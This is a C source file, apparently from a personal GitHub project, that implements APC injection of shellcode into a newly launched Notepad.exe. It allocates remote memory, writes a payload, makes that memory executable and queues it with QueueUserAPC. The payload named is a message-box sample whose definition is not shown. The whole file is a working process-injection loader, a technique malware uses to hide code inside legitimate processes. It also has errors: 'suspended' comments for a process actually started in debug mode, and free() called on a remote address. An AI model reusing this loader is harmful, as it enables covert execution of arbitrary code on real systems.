/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Base APC injection in a remote process.
 */

#include "apc.h"

#pragma warning (disable:4996)

#define TARGET_PROCESS "Notepad.exe"

/**
 * Create a process in SUSPENDED mode.
 * 
 * @param lpProcessName => nameof process to run.
 * @param hProcess => PHANDLE to new created process
 * @param hThread => PHANDLE to new main Thread of created process
 * @param dwProcessId => process id of new created process.
 */
BOOL CreateProcessDebugMode(IN LPCSTR lpProcessName, OUT PHANDLE hProcess, OUT PHANDLE hThread, OUT DWORD* dwProcessId){
    CHAR lpPath [MAX_PATH * 2];
    CHAR WinDr  [MAX_PATH];

    STARTUPINFOA			    Si = { 0 };
	PROCESS_INFORMATION		    Pi = { 0 };

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFOA);

    if(!GetEnvironmentVariableA("WINDIR", WinDr, MAX_PATH)){
        printf("[!] Unable to retrieve env variable... \n");
        return FALSE;
    }

    sprintf(lpPath, "%s\\System32\\%s", WinDr, lpProcessName);
    printf("[*] Running : \"%s\" ... ", lpPath);

    if(!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)){
        printf("[!] Error creating process using CreateProcessA... \n");
        return FALSE;
    }

        printf("\n[*] Successfully create new process in SUSPENDED_MODE \n");

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL){
        return TRUE;
    }

    return FALSE;
}

/**
 * Allocate shellcode in a remote process.
 * 
 * @param hProcess => handle to given process
 * @param pPayload => ptr to given payload to write
 * @param sPayloadSize => size of payload.
 * @param ppAddress => base address of writted payload.
 */
BOOL AllocateShellcode(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress){
    SIZE_T NumberBytesWritten = 0;
    DWORD  dwOldProtect       = 0;

    if(hProcess == NULL){
        return FALSE;
    }

    //allocate memory.
    *ppAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(*ppAddress == NULL){
        printf("[!] Error allocating memory.\n");
        return FALSE;
    }

    printf("[*] Memory allocated at address : %p \n", *ppAddress);

    //write memory
    if(!WriteProcessMemory(hProcess, *ppAddress, pPayload, sPayloadSize, &NumberBytesWritten)){
        printf("[!] Error writing memory to process\n");
        return FALSE;
    }

    if(!VirtualProtectEx(hProcess, *ppAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)){
        printf("[!] Error calling VirtualProtectEx \n");
        return FALSE;
    }

    printf("[*] Successfully Written %d Bytes\n", NumberBytesWritten);
    return TRUE;
}

//test
int main(){
    INT    state       = 0;
    HANDLE hProcess    = NULL;
    HANDLE hThread     = NULL; 
    DWORD  dwProcessId = 0;
    PVOID  pAddress    = NULL;

    //creating suspend process;
    if(!CreateProcessDebugMode(TARGET_PROCESS, &hProcess, &hThread, &dwProcessId)){
        printf("[!] Error trying to create new process in SUSPENDED mode... \n");
        return EXIT_FAILURE;
    }

    printf("[*] New process created with id : %d", dwProcessId);
    printf("\n[#] Go to to allocate memory -> PRESS ENTER. \n");
    getchar();

    //allocating memory
    if(!AllocateShellcode(hProcess, MessageBoxAPayload, sizeof(MessageBoxAPayload), &pAddress)){
        printf("[!] Error trying inject payload in new created process... \n");
        state = -1; goto _EndFunc;
    }

    //running QueueUserAPC
    QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

    printf("[i] Detaching The Target Process ... ");
	DebugActiveProcessStop(dwProcessId);
    
	printf("\n[*] DONE \n\n");
    printf("[#] Press <Enter> To Quit ... ");
	getchar();

_EndFunc:
    if(hProcess){
        CloseHandle(hProcess);
    }

    if(hThread){
        CloseHandle(hThread);
    }

    if(pAddress){
        free(pAddress);
    }

    return state;
}